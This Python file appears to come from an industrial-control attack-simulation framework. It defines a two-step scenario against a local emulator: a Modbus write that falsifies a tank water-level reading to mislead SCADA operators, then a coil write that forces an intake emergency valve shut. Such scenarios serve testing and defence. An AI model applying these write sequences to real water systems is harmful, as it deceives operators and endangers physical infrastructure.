"""Scenario: False Data Injection and Valve Interlock Manipulation."""

from seal.el.attack_graph import AttackGraph, EffectAction, EffectStep


def create_false_data_injection_campaign() -> AttackGraph:
    """Creates an attack graph simulating false telemetry injection followed by forced valve closure."""
    graph = AttackGraph(
        campaign_id="EL-CAMPAIGN-002",
        name="False Tank Telemetry & Valve Trip",
        description="Falsifies high tank water level to trick SCADA operators, then closes intake valve.",
    )

    step1 = EffectStep(
        step_id="STEP_SPOOF_01",
        name="Falsify Water Level Radar to 98%",
        description="Send unauthorized write command overriding water level register to 98.5%.",
        technique_id="T0855",
        action=EffectAction(
            action_type="MODBUS_WRITE",
            target_ip="127.0.0.1",
            target_port=5020,
            unit_id=1,
            function_code=16,
            register_address=1001,
            register_value=98.5,
            process_tag="TANK1_LEVEL_PCT",
        ),
    )

    step2 = EffectStep(
        step_id="STEP_VALVE_02",
        name="Force Intake Emergency Valve Close",
        description="Trigger emergency shutoff coil to starve plant intake.",
        technique_id="T0855",
        dependencies=["STEP_SPOOF_01"],
        action=EffectAction(
            action_type="MODBUS_WRITE",
            target_ip="127.0.0.1",
            target_port=5020,
            unit_id=1,
            function_code=5,
            register_address=2001,
            register_value=0,
            process_tag="VALVE1_INTAKE_STATE",
        ),
    )

    graph.add_step(step1)
    graph.add_step(step2)
    return graph
